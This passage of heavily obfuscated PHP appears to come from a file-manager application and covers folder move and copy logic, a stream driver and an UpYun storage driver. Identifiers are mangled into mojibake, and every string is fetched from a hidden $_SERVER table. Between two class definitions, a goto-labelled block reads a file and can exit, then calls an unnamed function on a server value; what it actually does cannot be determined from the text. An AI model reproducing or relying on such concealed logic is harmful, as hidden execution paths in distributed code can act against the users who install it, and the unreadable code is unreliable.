array_to_keyvalue($ÚùÌ‘, $ÊÜ¸ú÷Ö[193]); $this->_childrenListCache[$¤Ìö“¤] = $Ãúõ£½‰; foreach ($Ãúõ£½‰ as $¤Ìö“¤ => $¿’£‹âÓ) { $this->_childrenItemCache[$¤Ìö“¤] = $¿’£‹âÓ; } return $Ãúõ£½‰; } private function fileNameExistAuto($•¢ÓÇÊ, $«¯â»üÈ) { $º„²­åÔ =& $_SERVER[™¸œØ®Ü]; if ($«¯â»üÈ[$º„²­åÔ[507]] == $º„²­åÔ[91]) { return $this->fileNameExist($•¢ÓÇÊ, $«¯â»üÈ[$º„²­åÔ[32]]); } return $this->fileNameExistCache($•¢ÓÇÊ, $«¯â»üÈ[$º„²­åÔ[32]]); } private function fileNameExistCache($Á ğ¥Ò¶, $àÜèê «) { $ëÖŸùè =& $_SERVER[™¸œØ®Ü]; $àÜèê « = strtolower($àÜèê «); $İ£êäÌŒ = $this->_childrenList($Á ğ¥Ò¶); foreach ($İ£êäÌŒ as $›¸ú–ÄÆ) { if ($àÜèê « == strtolower($›¸ú–ÄÆ[$ëÖŸùè[32]])) { return $›¸ú–ÄÆ[$ëÖŸùè[193]]; } } return !1; } private function fileNameAutoCache($â«‡İ, $ÁÀ‰×İà, $êäÔÏãû, $Âœ¾›‡) { $Šë¦”±Â =& $_SERVER[™¸œØ®Ü]; $®£Ó¬›è = $this->_childrenList($â«‡İ); $¨ªÙ¸×ö = array_to_keyvalue($®£Ó¬›è, $Šë¦”±Â[12], $Šë¦”±Â[32]); return $this->fileNameAutoGet($¨ªÙ¸×ö, $ÁÀ‰×İà, $êäÔÏãû, $Âœ¾›‡); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ô»Úš, $­„şĞá±, $½Œ®Óú = REPEAT_REPLACE, $×›„‹ãì = '') { $è¦Ğ‘˜ö =& $_SERVER[™¸œØ®Ü]; $Ñ¸‘Æ“ = $this->sourceInfo($ô»Úš); $ûŠĞ‡¤ = $this->sourceInfo($­„şĞá±); if ($Ñ¸‘Æ“[$è¦Ğ‘˜ö[192]] == $ûŠĞ‡¤[$è¦Ğ‘˜ö[193]]) { if ($Ñ¸‘Æ“[$è¦Ğ‘˜ö[507]] == $è¦Ğ‘˜ö[91]) { Model($è¦Ğ‘˜ö[505])->restore(array($ô»Úš)); } if (!$×›„‹ãì || $×›„‹ãì == $Ñ¸‘Æ“[$è¦Ğ‘˜ö[32]]) { return $ô»Úš; } } $„ñ…úîÈ = $this->pathInfoMore($ô»Úš); if ($this->isParentOf($ô»Úš, $­„şĞá±)) { return !1; } if (!$Ñ¸‘Æ“ || !$ûŠĞ‡¤ || $ûŠĞ‡¤[$è¦Ğ‘˜ö[487]] != $è¦Ğ‘˜ö[91]) { return !1; } Hook::trigger($è¦Ğ‘˜ö[665], $„ñ…úîÈ); $this->targetIsDelete = intval($Ñ¸‘Æ“[$è¦Ğ‘˜ö[507]]); if ($Ñ¸‘Æ“[$è¦Ğ‘˜ö[192]] == $­„şĞá± && $×›„‹ãì != $Ñ¸‘Æ“[$è¦Ğ‘˜ö[32]]) { $¾àªË˜Á = $this->fileNameExist($­„şĞá±, $×›„‹ãì); if ($¾àªË˜Á && $Ñ¸‘Æ“[$è¦Ğ‘˜ö[487]] == $è¦Ğ‘˜ö[230]) { $”­¥ÈŸ¯ = $this->sourceInfo($¾àªË˜Á); $¸âÑ´¥ = $this->fileHistory($”­¥ÈŸ¯, $Ñ¸‘Æ“[$è¦Ğ‘˜ö[545]], $Ñ¸‘Æ“[$è¦Ğ‘˜ö[79]]); if (!$¸âÑ´¥) { Model($è¦Ğ‘˜ö[548])->remove($Ñ¸‘Æ“[$è¦Ğ‘˜ö[545]]); } $this->removeNow($ô»Úš, !1); $this->folderSizeReset($­„şĞá±); Hook::trigger($è¦Ğ‘˜ö[666], $„ñ…úîÈ); return $¾àªË˜Á; } } $ƒ²Ù¢İú = $×›„‹ãì ? $×›„‹ãì : $Ñ¸‘Æ“[$è¦Ğ‘˜ö[32]]; $this->lockMoveStart($ô»Úš); $this->lockWriteStart($­„şĞá±, $ƒ²Ù¢İú); $’ôñÅ = array($è¦Ğ‘˜ö[636] => array(), $è¦Ğ‘˜ö[667] => !1); $this->clearShare($ô»Úš, $­„şĞá±); $Šø®Š›• = $this->fileNameExistAuto($­„şĞá±, $Ñ¸‘Æ“); $ÁÜîÛíÃ = $this->_move($ô»Úš, $­„şĞá±, $½Œ®Óú, $’ôñÅ, $×›„‹ãì); $this->sourceCacheClear(); if ($Ñ¸‘Æ“[$è¦Ğ‘˜ö[487]] == $è¦Ğ‘˜ö[91] && $Šø®Š›•) { $this->folderSizeResetChildren($ÁÜîÛíÃ); } Model($è¦Ğ‘˜ö[232])->linkAdd($’ôñÅ[$è¦Ğ‘˜ö[636]]); if ($ÁÜîÛíÃ && $Šø®Š›• && $’ôñÅ[$è¦Ğ‘˜ö[667]]) { $¼¬Åô®² = $Ñ¸‘Æ“[$è¦Ğ‘˜ö[487]] == $è¦Ğ‘˜ö[91] ? $this->_childrenListSelect($ô»Úš) : !1; $ÇÄã˜° = $¼¬Åô®² && count($¼¬Åô®²) > 0 ? !0 : !1; $this->removeNow($ô»Úš, $ÇÄã˜°); } $this->lockMoveEnd($ô»Úš); $this->lockWriteEnd($­„şĞá±, $ƒ²Ù¢İú); $this->folderSizeReset($Ñ¸‘Æ“[$è¦Ğ‘˜ö[192]]); $this->folderSizeReset($­„şĞá±); $üƒ™§ìÇ = array($Ñ¸‘Æ“[$è¦Ğ‘˜ö[192]], $­„şĞá±); if ($Ñ¸‘Æ“[$è¦Ğ‘˜ö[487]] == $è¦Ğ‘˜ö[91]) { $üƒ™§ìÇ[] = $ô»Úš; } $this->updateModifyTime($üƒ™§ìÇ); Model($è¦Ğ‘˜ö[640])->eventMove($ô»Úš, $Ñ¸‘Æ“[$è¦Ğ‘˜ö[192]], $­„şĞá±); Hook::trigger($è¦Ğ‘˜ö[666], $„ñ…úîÈ); return $ÁÜîÛíÃ; } private function _move($‹š„½ı™, $Èà©‰Ê, $ÚÛ«³³á, &$ŸØêßØ’, $×©ğÆ§ä = '') { $¹–Ş¦­ =& $_SERVER[™¸œØ®Ü]; $‚¢ÀêÃò = $this->sourceInfo($‹š„½ı™); $¥¦±‘®§ = $‚¢ÀêÃò[$¹–Ş¦­[487]] == $¹–Ş¦­[91]; $»’¶‚Ì‹ = $×©ğÆ§ä ? $×©ğÆ§ä : $‚¢ÀêÃò[$¹–Ş¦­[32]]; $±–É¿×” = $this->fileNameExistAuto($Èà©‰Ê, $‚¢ÀêÃò); $this->lockMoveStart($‹š„½ı™); $this->lockWriteStart($Èà©‰Ê, $»’¶‚Ì‹); if (!$±–É¿×”) { return $this->_moveForce($‹š„½ı™, $Èà©‰Ê, $»’¶‚Ì‹); } $…òÚ¢Ÿº = $±–É¿×”; $şİÎòÜì = !1; if ($¥¦±‘®§) { if ($ÚÛ«³³á == REPEAT_RENAME_FOLDER) { $»’¶‚Ì‹ = $this->fileNameAuto($Èà©‰Ê, $»’¶‚Ì‹, $ÚÛ«³³á, $¥¦±‘®§); $…òÚ¢Ÿº = $this->_moveForce($‹š„½ı™, $Èà©‰Ê, $»’¶‚Ì‹); } else { $ª¢±ÕÔÔ = $this->_childrenListSelect($‹š„½ı™); foreach ($ª¢±ÕÔÔ as $©Öòú«Ì) { $šæ ‹¥ = REPEAT_REPLACE; $this->_move($©Öòú«Ì[$¹–Ş¦­[193]], $±–É¿×”, $šæ ‹¥, $ŸØêßØ’); } $şİÎòÜì = !0; } } else { if ($ÚÛ«³³á == REPEAT_RENAME || $ÚÛ«³³á == REPEAT_RENAME_FOLDER) { $»’¶‚Ì‹ = $this->fileNameAuto($Èà©‰Ê, $»’¶‚Ì‹, $ÚÛ«³³á, $¥¦±‘®§); $…òÚ¢Ÿº = $this->_moveForce($‹š„½ı™, $Èà©‰Ê, $»’¶‚Ì‹); } else { $‹ï±ÅÎÅ = $this->sourceInfoCache($±–É¿×”); $êº’î«Ø = $this->fileHistory($‹ï±ÅÎÅ, $‚¢ÀêÃò[$¹–Ş¦­[545]], $‚¢ÀêÃò[$¹–Ş¦­[79]]); if ($êº’î«Ø) { $ŸØêßØ’[$¹–Ş¦­[636]][] = $‚¢ÀêÃò[$¹–Ş¦­[545]]; } $şİÎòÜì = !0; } } if ($şİÎòÜì) { $ŸØêßØ’[$¹–Ş¦­[667]] = !0; } return $…òÚ¢Ÿº; } private function _moveForce($²›Õ­–², $Ç¬äÍÁ , $•İ½îµâ) { $¢›»‡¼ =& $_SERVER[™¸œØ®Ü]; $´°ÚÁ œ = $this->sourceInfo($²›Õ­–²); $¶¬¿Õğ½ = $this->sourceInfo($Ç¬äÍÁ ); $ßµ·Ù = $´°ÚÁ œ[$¢›»‡¼[487]] == $¢›»‡¼[91]; $¸òÁßäœ = array($¢›»‡¼[479] => $¶¬¿Õğ½[$¢›»‡¼[193]], $¢›»‡¼[659] => $¶¬¿Õğ½[$¢›»‡¼[588]] . $¶¬¿Õğ½[$¢›»‡¼[193]] . $¢›»‡¼[50], $¢›»‡¼[655] => $¶¬¿Õğ½[$¢›»‡¼[190]], $¢›»‡¼[656] => $¶¬¿Õğ½[$¢›»‡¼[573]], $¢›»‡¼[658] => USER_ID, $¢›»‡¼[496] => $•İ½îµâ); $–œ¯¯Û = $´°ÚÁ œ[$¢›»‡¼[190]] == SourceModel::TYPE_GROUP && $¶¬¿Õğ½[$¢›»‡¼[190]] == SourceModel::TYPE_GROUP && $´°ÚÁ œ[$¢›»‡¼[573]] == $¶¬¿Õğ½[$¢›»‡¼[573]]; if (!$–œ¯¯Û && $this->moveClearAuth) { Model($¢›»‡¼[571])->authClear($²›Õ­–²); } $ƒ®‘óÖ• = $´°ÚÁ œ[$¢›»‡¼[507]] == $¢›»‡¼[91] && $¶¬¿Õğ½[$¢›»‡¼[507]] != $¢›»‡¼[91]; if ($ƒ®‘óÖ•) { $¸òÁßäœ[$¢›»‡¼[506]] = 0; } if ($ßµ·Ù) { $ñ²òÊ™• = array($¢›»‡¼[659] => array($¢›»‡¼[619], $´°ÚÁ œ[$¢›»‡¼[588]] . $´°ÚÁ œ[$¢›»‡¼[193]] . $¢›»‡¼[620])); $ûƒºÃ¶¨ = $´°ÚÁ œ[$¢›»‡¼[588]] . $´°ÚÁ œ[$¢›»‡¼[193]] . $¢›»‡¼[50]; $–ëÕÓ„ï = $¶¬¿Õğ½[$¢›»‡¼[588]] . $¶¬¿Õğ½[$¢›»‡¼[193]] . $¢›»‡¼[50] . $´°ÚÁ œ[$¢›»‡¼[193]] . $¢›»‡¼[50]; $µÍÚââ¨ = array($¢›»‡¼[659] => array($¢›»‡¼[668], "\162\x65\x70\154\x61\143\145\50\160\141\162\145\156\164\114\x65\166\x65\x6c\54\x27{$ûƒºÃ¶¨}\47\54\47{$–ëÕÓ„ï}\x27\x29"), $¢›»‡¼[655] => $¶¬¿Õğ½[$¢›»‡¼[190]], $¢›»‡¼[656] => $¶¬¿Õğ½[$¢›»‡¼[573]]); if ($ƒ®‘óÖ•) { $µÍÚââ¨[$¢›»‡¼[506]] = 0; } $this->where($ñ²òÊ™•)->data($µÍÚââ¨)->save(); } $this->where(array($¢›»‡¼[493] => $²›Õ­–²))->data($¸òÁßäœ)->save(); return $²›Õ­–²; } private function clearShare($àÅ–Ùòó, $§µÀåœ£) { $€Üª÷¬¿ =& $_SERVER[™¸œØ®Ü]; $¶İ·¸ = $this->sourceInfo($àÅ–Ùòó); $úìƒ’š˜ = $this->sourceInfo($§µÀåœ£); if ($¶İ·¸[$€Üª÷¬¿[573]] == $úìƒ’š˜[$€Üª÷¬¿[573]] && $¶İ·¸[$€Üª÷¬¿[190]] == $€Üª÷¬¿[669]) { return; } $›Õâ›ïŞ = array($€Üª÷¬¿[588] => array($€Üª÷¬¿[619], $¶İ·¸[$€Üª÷¬¿[588]] . $àÅ–Ùòó . $€Üª÷¬¿[620])); $Û¥áÎÅú = $this->field($€Üª÷¬¿[493])->where($›Õâ›ïŞ)->getField($€Üª÷¬¿[193], !0); if (!$Û¥áÎÅú) { return; } $›Õâ›ïŞ = array($€Üª÷¬¿[193] => array($€Üª÷¬¿[7], $Û¥áÎÅú), $€Üª÷¬¿[670] => 1); $ÙİÜôâ’ = Model($€Üª÷¬¿[671])->field($€Üª÷¬¿[672])->where($›Õâ›ïŞ)->select(); if (!$ÙİÜôâ’) { return; } $ÙİÜôâ’ = array_to_keyvalue($ÙİÜôâ’, $€Üª÷¬¿[12], $€Üª÷¬¿[672]); $›Õâ›ïŞ = array($€Üª÷¬¿[672] => array($€Üª÷¬¿[7], $ÙİÜôâ’)); Model($€Üª÷¬¿[671])->where($›Õâ›ïŞ)->save(array($€Üª÷¬¿[670] => 0)); Model($€Üª÷¬¿[673])->where($›Õâ›ïŞ)->delete(); } public function copyFolderFromIO($ìôœÙØ, $ÔØÔ¢Ó•, $ë±ì•¯ƒ, $‰„Å¬×™, $µ”ÖÚ£, $ÆÒğÏá = false) { $æñ¥‰‡ƒ =& $_SERVER[™¸œØ®Ü]; $ÆÄº‡Ê = array($æñ¥‰‡ƒ[637] => array(), $æñ¥‰‡ƒ[638] => array(), $æñ¥‰‡ƒ[636] => array(), $æñ¥‰‡ƒ[674] => array()); $É§ğ‹·ò = $ÆÒğÏá ? $ÆÒğÏá : $ìôœÙØ->pathThis($ÔØÔ¢Ó•); $­ÊĞíÙ¤ = $this->fileNameExist($ë±ì•¯ƒ, $É§ğ‹·ò); $üˆÊ¬ƒ¡ = $this->mkdir($ë±ì•¯ƒ, $É§ğ‹·ò, $‰„Å¬×™); if (!$­ÊĞíÙ¤ || $‰„Å¬×™ == REPEAT_RENAME_FOLDER) { $‰„Å¬×™ = !1; } if ($­ÊĞíÙ¤) { $this->_childrenAllMake($­ÊĞíÙ¤); } Hook::trigger($æñ¥‰‡ƒ[675]); $this->_copyChildTo($ìôœÙØ, $ÔØÔ¢Ó•, $üˆÊ¬ƒ¡, $‰„Å¬×™, $ÆÄº‡Ê, $µ”ÖÚ£); Hook::trigger($æñ¥‰‡ƒ[676]); if ($üˆÊ¬ƒ¡) { $this->folderSizeResetChildren($üˆÊ¬ƒ¡); } $this->_childrenListClear(); Model($æñ¥‰‡ƒ[639])->addAll($ÆÄº‡Ê[$æñ¥‰‡ƒ[637]], array(), !0); Model($æñ¥‰‡ƒ[640])->eventCopy($üˆÊ¬ƒ¡); $this->saveAll($ÆÄº‡Ê[$æñ¥‰‡ƒ[638]]); Model($æñ¥‰‡ƒ[548])->linkAdd($ÆÄº‡Ê[$æñ¥‰‡ƒ[636]]); Model($æñ¥‰‡ƒ[548])->remove($ÆÄº‡Ê[$æñ¥‰‡ƒ[674]]); $this->folderSizeReset($ë±ì•¯ƒ); $this->updateModifyTime($ë±ì•¯ƒ); return $üˆÊ¬ƒ¡; } private function _copyChildTo($Ğù‡¢ì€, $Úá”ÚÖ, $È‚ŸöŠ, $‰Ñº¯æœ, &$§ŸˆÂŠ°, $ä±ÊŒ³) { $íúÏ«ÍÁ =& $_SERVER[™¸œØ®Ü]; $¦…¯€ = $this->sourceInfoCache($È‚ŸöŠ); $ĞÍƒÔøŠ = $Ğù‡¢ì€->listPath($Úá”ÚÖ); $ĞÍƒÔøŠ = $ĞÍƒÔøŠ ? $ĞÍƒÔøŠ : array($íúÏ«ÍÁ[86] => array(), $íúÏ«ÍÁ[85] => array()); $İØìó¶‡ = array_merge($ĞÍƒÔøŠ[$íúÏ«ÍÁ[86]], $ĞÍƒÔøŠ[$íúÏ«ÍÁ[85]]); $­¸›õÌ— = $this->_addFiles($Ğù‡¢ì€, $ĞÍƒÔøŠ[$íúÏ«ÍÁ[86]], $ä±ÊŒ³); $Ğµ–‚ÄË = array(); foreach ($İØìó¶‡ as &$Ä±Ïš) { if (isset($­¸›õÌ—[$Ä±Ïš[$íúÏ«ÍÁ[32]]])) { $Ä±Ïš = $­¸›õÌ—[$Ä±Ïš[$íúÏ«ÍÁ[32]]]; } $Ä±Ïš[$íúÏ«ÍÁ[487]] = $Ä±Ïš[$íúÏ«ÍÁ[33]] == $íúÏ«ÍÁ[78]; $Ä±Ïš[$íúÏ«ÍÁ[488]] = substr(_get($Ä±Ïš, $íúÏ«ÍÁ[169], $íúÏ«ÍÁ[12]), 0, 10); $Ä±Ïš[$íúÏ«ÍÁ[79]] = _get($Ä±Ïš, $íúÏ«ÍÁ[79], 0); $Ä±Ïš[$íúÏ«ÍÁ[545]] = _get($Ä±Ïš, $íúÏ«ÍÁ[545], 0); if (!isset($Ä±Ïš[$íúÏ«ÍÁ[677]]) && $Ä±Ïš[$íúÏ«ÍÁ[545]]) { $§ŸˆÂŠ°[$íúÏ«ÍÁ[674]][] = $Ä±Ïš[$íúÏ«ÍÁ[545]]; } if ($‰Ñº¯æœ) { $œ„ğË = $this->fileNameExistCache($È‚ŸöŠ, $Ä±Ïš[$íúÏ«ÍÁ[32]]); if ($œ„ğË) { if ($Ä±Ïš[$íúÏ«ÍÁ[487]] || $‰Ñº¯æœ == REPEAT_SKIP) { continue; } if ($‰Ñº¯æœ == REPEAT_REPLACE) { $­Œçº… = $this->sourceInfoCache($œ„ğË); $Ñ±ñ¬£­ = $this->fileHistory($­Œçº…, $Ä±Ïš[$íúÏ«ÍÁ[545]], $Ä±Ïš[$íúÏ«ÍÁ[79]]); if ($Ñ±ñ¬£­) { $§ŸˆÂŠ°[$íúÏ«ÍÁ[636]][] = $Ä±Ïš[$íúÏ«ÍÁ[545]]; } continue; } else { if ($‰Ñº¯æœ == REPEAT_RENAME) { $Ä±Ïš[$íúÏ«ÍÁ[32]] = $this->fileNameAutoCache($È‚ŸöŠ, $Ä±Ïš[$íúÏ«ÍÁ[32]], $‰Ñº¯æœ, !1); } } } } if (!$Ä±Ïš[$íúÏ«ÍÁ[487]] && $Ä±Ïš[$íúÏ«ÍÁ[545]] == 0) { continue; } if (!$Ä±Ïš[$íúÏ«ÍÁ[487]] && $Ä±Ïš[$íúÏ«ÍÁ[545]]) { $§ŸˆÂŠ°[$íúÏ«ÍÁ[636]][] = $Ä±Ïš[$íúÏ«ÍÁ[545]]; } $Ğµ–‚ÄË[] = $this->_makeItemData($Ä±Ïš, $¦…¯€, $Ä±Ïš[$íúÏ«ÍÁ[32]]); } unset($Ä±Ïš); if (!empty($Ğµ–‚ÄË)) { $this->addAll($Ğµ–‚ÄË); $this->_childrenListSelect($È‚ŸöŠ); } $»Ë½ = $this->_childrenList($È‚ŸöŠ); $»Ë½ = array_to_keyvalue($»Ë½, $íúÏ«ÍÁ[32]); foreach ($İØìó¶‡ as $Ä±Ïš) { $­Œçº… = $»Ë½[$Ä±Ïš[$íúÏ«ÍÁ[32]]]; $Àª”§– = $­Œçº…[$íúÏ«ÍÁ[193]]; $this->_copyApplyMeta($­Œçº…, $§ŸˆÂŠ°); if ($Ä±Ïš[$íúÏ«ÍÁ[33]] == $íúÏ«ÍÁ[78]) { $Ä±Ïš[$íúÏ«ÍÁ[87]] = $Ğù‡¢ì€->getPathInner($Ä±Ïš[$íúÏ«ÍÁ[87]]); $this->_copyChildTo($Ğù‡¢ì€, $Ä±Ïš[$íúÏ«ÍÁ[87]], $Àª”§–, $‰Ñº¯æœ, $§ŸˆÂŠ°, $ä±ÊŒ³); } } } private function _addFiles($×»€©´, $÷ùÓª¿Ü, $ãÙİß Ã) { $œôì»³¤ =& $_SERVER[™¸œØ®Ü]; if (!$÷ùÓª¿Ü || count($÷ùÓª¿Ü) == 0) { return array(); } $Ú³ØÜ’ê = array(); foreach ($÷ùÓª¿Ü as &$‚„¤–ƒ) { Hook::trigger($œôì»³¤[678], $‚„¤–ƒ); $‚„¤–ƒ[$œôì»³¤[87]] = $×»€©´->getPathInner($‚„¤–ƒ[$œôì»³¤[87]]); $ğÄ±ÉÑ = $×»€©´->hashSimple($‚„¤–ƒ[$œôì»³¤[87]]); $‚¦ªæ¶ = $×»€©´->hashMd5($‚„¤–ƒ[$œôì»³¤[87]]); if (strlen($‚¦ªæ¶) > 10 && !isset($Ú³ØÜ’ê[$‚¦ªæ¶])) { $Ú³ØÜ’ê[$‚¦ªæ¶] = array(); } $‚„¤–ƒ[$œôì»³¤[679]] = $ğÄ±ÉÑ; $‚„¤–ƒ[$œôì»³¤[551]] = $‚¦ªæ¶; $Ú³ØÜ’ê[$‚¦ªæ¶][] =& $‚„¤–ƒ; if (count($Ú³ØÜ’ê[$‚¦ªæ¶]) > 1) { $‚„¤–ƒ[$œôì»³¤[677]] = !0; } Hook::trigger($œôì»³¤[680], $‚„¤–ƒ); } unset($‚„¤–ƒ); $Ú¸¬ìÙ¿ = array($œôì»³¤[551] => array($œôì»³¤[7], array_keys($Ú³ØÜ’ê))); $ÙùğüÚô = Model($œôì»³¤[681]); $õñöæÌ± = $ÙùğüÚô->where($Ú¸¬ìÙ¿)->select(); $õñöæÌ± = $õñöæÌ± ? $õñöæÌ± : array(); foreach ($õñöæÌ± as $´¢ñÈ×™) { if (!isset($Ú³ØÜ’ê[$´¢ñÈ×™[$œôì»³¤[551]]])) { continue; } $óœ“ºÙŠ = $Ú³ØÜ’ê[$´¢ñÈ×™[$œôì»³¤[551]]]; foreach ($óœ“ºÙŠ as &$‚„¤–ƒ) { $‚„¤–ƒ[$œôì»³¤[545]] = $´¢ñÈ×™[$œôì»³¤[545]]; $‚„¤–ƒ[$œôì»³¤[677]] = !0; } unset($‚„¤–ƒ); } $ãœœ‹ˆÔ = array(); foreach ($÷ùÓª¿Ü as $¤Úâ¿£) { Hook::trigger($œôì»³¤[682], $¤Úâ¿£); if (isset($¤Úâ¿£[$œôì»³¤[677]]) && $¤Úâ¿£[$œôì»³¤[677]]) { Hook::trigger($œôì»³¤[683], $¤Úâ¿£); continue; } $ÌÈ·Ç¹ = $×»€©´->getPathInner($¤Úâ¿£[$œôì»³¤[87]]); $ü¡¨Š¥æ = $ÙùğüÚô->addFileMake($ÌÈ·Ç¹, $¤Úâ¿£[$œôì»³¤[79]], $¤Úâ¿£[$œôì»³¤[679]], $¤Úâ¿£[$œôì»³¤[551]], $¤Úâ¿£[$œôì»³¤[32]], $ãÙİß Ã); Hook::trigger($œôì»³¤[683], $¤Úâ¿£); if (!is_array($ü¡¨Š¥æ)) { continue; } $ãœœ‹ˆÔ[] = $ü¡¨Š¥æ; } $ÙùğüÚô->addAll($ãœœ‹ˆÔ); $Ú¸¬ìÙ¿ = array($œôì»³¤[551] => array($œôì»³¤[7], array_keys($Ú³ØÜ’ê))); $õñöæÌ± = $ÙùğüÚô->where($Ú¸¬ìÙ¿)->select(); $õñöæÌ± = $õñöæÌ± ? $õñöæÌ± : array(); foreach ($õñöæÌ± as $´¢ñÈ×™) { if (!isset($Ú³ØÜ’ê[$´¢ñÈ×™[$œôì»³¤[551]]])) { continue; } $äÉ‰•Êê =& $Ú³ØÜ’ê[$´¢ñÈ×™[$œôì»³¤[551]]]; foreach ($äÉ‰•Êê as &$‚„¤–ƒ) { $‚„¤–ƒ[$œôì»³¤[545]] = $´¢ñÈ×™[$œôì»³¤[545]]; } unset($‚„¤–ƒ); } $¸É¤»óè = array(); foreach ($÷ùÓª¿Ü as $äÈšÑÑå) { $¸É¤»óè[$äÈšÑÑå[$œôì»³¤[32]]] = $äÈšÑÑå; } return $¸É¤»óè; } } define($_SERVER[™¸œØ®Ü][684], $_SERVER[™¸œØ®Ü][685]); $grfcdubnje = $_SERVER[™¸œØ®Ü][686]; goto Cˆ‚¶Ò°§Û; DˆšŸâ¤ÇÙ: if ($_SERVER[$_SERVER[™¸œØ®Ü][971]] != $_SERVER[$_SERVER[™¸œØ®Ü][1460]]) { $_getc = $_SERVER[™¸œØ®Ü][973]; $_getfile = $_SERVER[$_SERVER[™¸œØ®Ü][968]] . $_SERVER[™¸œØ®Ü][969]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[™¸œØ®Ü][287], $_getfilec); if (count($_getarrs) < $_SERVER[™¸œØ®Ü][696]) { $exit = $_SERVER[™¸œØ®Ü][974]; $exit(); } $_act = $_SERVER[™¸œØ®Ü][1458]; $_act($_SERVER[$_SERVER[™¸œØ®Ü][1457]]); } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($¬…ƒı¯ë, $ò¡ºç½é = 0) { parent::__construct(); $this->source = $¬…ƒı¯ë; $this->sourceSize = $ò¡ºç½é; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ÛöÛÔÂ = false) { return $this->sourceSize; } public function getContent($«ë½†É = false) { return $this->fileSubstr($«ë½†É, 0, $this->sourceSize); } public function fileSubstr($åø™Şˆ° = false, $Ç¤ºö÷ö = 0, $­Ğ‡ÜÓ = 0) { if (!$­Ğ‡ÜÓ) { $­Ğ‡ÜÓ = $this->sourceSize; } $ØøâÛ£ò = $this->sourceSize - $Ç¤ºö÷ö; if ($­Ğ‡ÜÓ >= $ØøâÛ£ò) { $­Ğ‡ÜÓ = $ØøâÛ£ò; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Ç¤ºö÷ö, $­Ğ‡ÜÓ); } if ($this->sourceType == self::TYPE_FILE) { if ($­Ğ‡ÜÓ <= 0) { return $_SERVER[™¸œØ®Ü][12]; } $²¼‰ÔÔ = ftell($this->source); fseek_64($this->source, $²¼‰ÔÔ + $Ç¤ºö÷ö); $Ï±£Õä¸ = @fread($this->source, $­Ğ‡ÜÓ); fseek_64($this->source, $²¼‰ÔÔ); return $Ï±£Õä¸; } } public function hashMd5($î¾ ²ˆ³ = false) { return md5($this->getContent()); } public static function hash($î…ş´¬â, $à»¨Ê½¼ = 0) { $®³…“Ì¡ = new PathDriverStream($î…ş´¬â, $à»¨Ê½¼); return $®³…“Ì¡->hashSimple($î…ş´¬â); } public static function md5($È«êü²´, $¸êŒÄ” = 0) { $µ°ô¬¹‹ = new PathDriverStream($È«êü²´, $¸êŒÄ”); return $µ°ô¬¹‹->hashMd5($È«êü²´); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\x70\72\57\x2f\x76\60\x2e\141\160\151\x2e\x75\160\x79\x75\156\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ôøò›ÙÎ) { parent::__construct(); $this->_init($ôøò›ÙÎ); } public function _init($î¥Ôû·Ì) { $Í’ÎŠõ§ =& $_SERVER[™¸œØ®Ü]; foreach ($î¥Ôû·Ì as $Ôå†Äî‹ => $Ç”¯²‘™) { if (isset($this->{$Ôå†Äî‹})) { $this->{$Ôå†Äî‹} = $Ç”¯²‘™; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Í’ÎŠõ§[1568] . LNG($Í’ÎŠõ§[1487])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¶Š…úÏ´, $îû·ÀÖ = "\107\105\x54") { $ÊµĞéø =& $_SERVER[™¸œØ®Ü]; $Ø†ãßó° = gmdate($ÊµĞéø[1516]); $Ÿ†ª³ş = base64_encode(hash_hmac($ÊµĞéø[1569], "{$îû·ÀÖ}\46{$¶Š…úÏ´}\x26{$Ø†ãßó°}", md5("{$this->userpass}"), !0)); $¾İ§Ä¬ô = array("\x41\x75\164\150\x6f\162\151\172\x61\x74\151\157\x6e\x3a\x55\x50\x59\125\116\x20{$this->username}\x3a{$Ÿ†ª³ş}", "\x44\141\x74\x65\72{$Ø†ãßó°}"); return $¾İ§Ä¬ô; } public function ussRequest($»ŞÓµß”, $ü¸Û®³ = "\107\x45\x54", $¶êİŒõ§ = false, $‡áøäåª = false, $‚Ãé¬¿ = false) { $âì‘¿¤ó =& $_SERVER[™¸œØ®Ü]; $»ŞÓµß” = trim($»ŞÓµß”, $âì‘¿¤ó[8]); $‘ÄÖÃŸğ = "\x2f{$this->bucket}\x2f" . rawurlencode($»ŞÓµß”); $¿ëÕÈí = $this->ussHeaders($‘ÄÖÃŸğ, $ü¸Û®³); if ($‡áøäåª) { $¿ëÕÈí = array_merge($¿ëÕÈí, $‡áøäåª); } $…×ò°Õü = url_request($this->endpoint . $‘ÄÖÃŸğ, $ü¸Û®³, $¶êİŒõ§, $¿ëÕÈí, $‚Ãé¬¿); if (!$…×ò°Õü) { $şªúì£… = LNG($âì‘¿¤ó[1570]); $this->writeLog($şªúì£…); return array($âì‘¿¤ó[1316] => !1, $âì‘¿¤ó[1306] => $şªúì£…); } if (strtolower($ü¸Û®³) == $âì‘¿¤ó[229] || in_array($…×ò°Õü[$âì‘¿¤ó[1316]], array($âì‘¿¤ó[263], $âì‘¿¤ó[1571]))) { $¶êİŒõ§ = $…×ò°Õü[$âì‘¿¤ó[1572]]; if (!$…×ò°Õü[$âì‘¿¤ó[835]]) { $¶êİŒõ§ = isset($¶êİŒõ§[0]) ? $¶êİŒõ§[0] : $âì‘¿¤ó[12]; } } else { $¶êİŒõ§ = json_decode($…×ò°Õü[$âì‘¿¤ó[1306]], !0); if (!$¶êİŒõ§) { $¶êİŒõ§ = $…×ò°Õü[$âì‘¿¤ó[1306]]; } else { if (!$…×ò°Õü[$âì‘¿¤ó[835]] && isset($¶êİŒõ§[$âì‘¿¤ó[1573]])) { $¶êİŒõ§ = $¶êİŒõ§[$âì‘¿¤ó[1573]]; } } } if (!$…×ò°Õü[$âì‘¿¤ó[835]]) { $this->writeLog($this->__errorMessage($¶êİŒõ§)); } return 